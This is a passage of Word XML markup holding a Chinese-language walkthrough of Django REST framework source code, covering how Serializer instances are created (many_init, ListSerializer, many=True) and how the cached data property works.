      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>仍然没有找到该属性，就要交给新式类自己的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__getattribute__</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>去执行，以保证该类的属性查找正常运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F0DD51" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:firstLine="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>三、Serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08674AEA"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restframework/serializers.py/class Serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB1A85A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:rtl/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="85C7B0"/>
          <w:kern w:val="0"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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类继承了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BaseSerializer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，并且没有重写</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>和</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方法，所以当该类实例化产生对象的时候，调用的是父类</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BaseSerializer</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__init__</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>和</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2394917D"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restframework/serializers.py/class BaseSerializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159E2794"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516BE4B1" wp14:editId="33314719">
            <wp:extent cx="7828417" cy="3248297"/>
            <wp:effectExtent l="0" t="0" r="1270" b="9525"/>
            <wp:docPr id="23" name="图片 2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43886" cy="3254716"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6110F6"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先执行</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方法，实例化一个空对象，在实例化对象的时候，有可能以关键字传参的形式传入</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参数，该参数在</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方法中被</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>**kwargs</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>接受，放入字典中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D4900B"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中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>判断是将</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取出，当</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值为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>或者</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参数没有传入的时候，不执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>下面的语句，也就是会正常实例化一个对象，</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并未对对象的创建过程做拦截。如果</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中有值并且其</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不为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>时，会执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>many_init</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA6FEBD"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restframework/serializers.py/class BaseSerializer/def many_init()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23878588" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:rtl/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="85C7B0"/>
          <w:kern w:val="0"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>在执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>many_init</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法时，返回的是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ListSerializer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>对象。具体执行过程已经在图上标出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211A8953"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将</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>对象而不是数据对象作为参数，进行序列化时，必须写</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>many=True</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>（必须用关键字传参的形式）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1213039B" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="宋体"/>
          <w:color w:val="3A4145"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="3A4145"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>隐藏页面特效</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7E0B99" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="500" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:rtl/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="5D69A5"/>
          <w:kern w:val="36"/>
          <w:sz w:val="49"/>
          <w:szCs w:val="49"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>四、Serializer对象的data属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448FF8EC"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在《</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Django-rest-framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>源码分析（一）》中我分析了</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对象实例化的过程，而</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类的其他方法并没有涉及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624D57D0"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序列化最重要的是拿到对象序列化后的结果，这个结果被保存在了序列化对象的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属性中。下面重点来看</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属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2EBDD9"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入口</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> serializer_obj.data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38360E44"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Serializer/def data()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCE17C7"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04815A09" wp14:editId="7167B779">
            <wp:extent cx="6355715" cy="940515"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:docPr id="28" name="图片 28">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84248" cy="944737"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5972F54C" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150" w:line="3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它是一个被包装成属性的方法，在方法中执行了父类的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方法，并且把父类</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的返回值转化成</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ReturnDict</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>数据类型返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3953CE" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150" w:line="30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data()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7450CE97" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A1F3B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32F6A39B" wp14:editId="3AEF3485">
            <wp:extent cx="8039735" cy="2819270"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="29" name="图片 29">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079512" cy="2833218"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B125F01"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红框内的部分实现了一种类似单例的模式，当序列化对象有</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性的时候，直接返回，不调用函数，这就避免了资源的浪费，去重复执行一些函数（因为每一次执行的结果都是相同的）。它的实现方式是利用反射查找属性</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>是否存在，如果不存在，把要返回的结果设置给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
